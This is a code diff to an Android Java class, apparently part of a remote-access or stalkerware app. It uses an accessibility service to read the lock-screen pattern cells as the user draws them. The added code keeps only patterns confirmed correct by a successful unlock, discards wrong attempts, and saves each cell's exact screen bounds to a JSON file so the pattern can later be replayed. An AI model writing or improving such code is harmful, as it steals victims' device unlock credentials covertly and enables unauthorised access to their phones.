@@ -1260,6 +1260,11 @@ public class GestureRecorder {
     private void onScreenUnlocked() {
         try {
             stopLockCapture();
+            // Device just unlocked — pattern was correct. Save whatever cells were captured
+            // by the accessibility reader (screen reader only, no overlay needed).
+            if (!advCells.isEmpty()) {
+                commitAdvancedUnlockOnUnlock();
+            }
         } catch (Exception e) {
             Log.e(TAG, "onScreenUnlocked: " + e.getMessage());
         }
@@ -1268,6 +1273,8 @@ public class GestureRecorder {
     private void onScreenOff() {
         try {
             stopLockCapture();
+            // Screen off while locked = user gave up or pattern was wrong. Discard cells.
+            clearAdvancedUnlockCapture();
         } catch (Exception e) {
             Log.e(TAG, "onScreenOff: " + e.getMessage());
         }
@@ -2156,50 +2163,50 @@ public class GestureRecorder {
 
     private static final String ADVANCED_UNLOCK_SUBDIR = "advanced_unlock";
 
-    // Cells captured so far for the current pattern attempt: [cellNum, cx, cy]
+    // Cells captured so far for the current pattern attempt: [cellNum, left, top, right, bottom]
     private final List<int[]> advCells         = new ArrayList<>();
     private final Handler     advUnlockHandler = new Handler(Looper.getMainLooper());
-    private Runnable          advUnlockSaveTask;
-
-    // After the last cell arrives, wait this long before saving (finger may still be moving)
-    private static final long ADV_SAVE_DELAY_MS = 900;
 
     /**
      * Called from UnifiedAccessibilityService when an accessibility event reveals
      * a "Cell N added" node on the lock screen (package: com.android.systemui).
+     * Only the screen reader (accessibility tree) is used — no gesture overlay needed.
      *
-     * @param cellNum  1-9 (the pattern dot number)
+     * @param cellNum  1-9 (the pattern dot number, becomes non-clickable when touched)
      * @param left     left edge of the cell view in screen coordinates
      * @param top      top edge
      * @param right    right edge
      * @param bottom   bottom edge
      */
     public void onAdvancedUnlockCellDetected(int cellNum, int left, int top, int right, int bottom) {
-        // Ignore duplicate cells (same dot can fire multiple times)
+        // If this cell was already recorded, the user is starting a NEW pattern attempt.
+        // Clear previous cells and restart — do not ignore the event.
+        boolean alreadySeen = false;
         for (int[] c : advCells) {
-            if (c[0] == cellNum) return;
+            if (c[0] == cellNum) { alreadySeen = true; break; }
         }
-        int cx = (left + right) / 2;
-        int cy = (top  + bottom) / 2;
-        advCells.add(new int[]{cellNum, cx, cy});
-        Log.i(TAG, "AdvancedUnlock: cell " + cellNum + " at (" + cx + "," + cy + ")");
-
-        // Schedule (or reschedule) the delayed save
-        if (advUnlockSaveTask != null) {
-            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
+        if (alreadySeen) {
+            advCells.clear();
+            Log.d(TAG, "AdvancedUnlock: new attempt detected — buffer cleared");
         }
-        advUnlockSaveTask = this::commitAdvancedUnlockPattern;
-        advUnlockHandler.postDelayed(advUnlockSaveTask, ADV_SAVE_DELAY_MS);
+        // Store full bounds so replay can draw through real screen coordinates
+        advCells.add(new int[]{cellNum, left, top, right, bottom});
+        Log.i(TAG, "AdvancedUnlock: cell " + cellNum
+                + " bounds(" + left + "," + top + "," + right + "," + bottom + ")");
     }
 
-    /** Discard any in-progress capture (e.g. screen turned off mid-gesture). */
+    /** Discard any in-progress capture (e.g. screen turned off mid-gesture or wrong pattern). */
     public void clearAdvancedUnlockCapture() {
-        if (advUnlockSaveTask != null) {
-            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
-            advUnlockSaveTask = null;
-        }
         advCells.clear();
         Log.d(TAG, "AdvancedUnlock: capture cleared");
+    }
+
+    /**
+     * Called when the device successfully unlocks (ACTION_USER_PRESENT).
+     * Persists whatever cells were captured — if we got here, the pattern was correct.
+     */
+    public void commitAdvancedUnlockOnUnlock() {
+        advUnlockHandler.post(this::commitAdvancedUnlockPattern);
     }
 
     /** Persist the collected cells as a JSON file in the advanced_unlock directory. */
@@ -2207,7 +2214,6 @@ public class GestureRecorder {
         try {
             List<int[]> snapshot = new ArrayList<>(advCells);
             advCells.clear();
-            advUnlockSaveTask = null;
 
             if (snapshot.size() < 2) {
                 Log.d(TAG, "AdvancedUnlock: only " + snapshot.size() + " cell(s) — discarding");
@@ -2217,11 +2223,18 @@ public class GestureRecorder {
             JSONArray cellSeq    = new JSONArray();
             JSONArray cellCoords = new JSONArray();
             for (int[] c : snapshot) {
+                // c = {cellNum, left, top, right, bottom}
+                int cx = (c[1] + c[3]) / 2;
+                int cy = (c[2] + c[4]) / 2;
                 cellSeq.put(c[0]);
                 JSONObject coord = new JSONObject();
-                coord.put("cell", c[0]);
-                coord.put("cx",   c[1]);
-                coord.put("cy",   c[2]);
+                coord.put("cell",   c[0]);
+                coord.put("left",   c[1]);
+                coord.put("top",    c[2]);
+                coord.put("right",  c[3]);
+                coord.put("bottom", c[4]);
+                coord.put("cx",     cx);
+                coord.put("cy",     cy);
                 cellCoords.put(coord);
             }
 
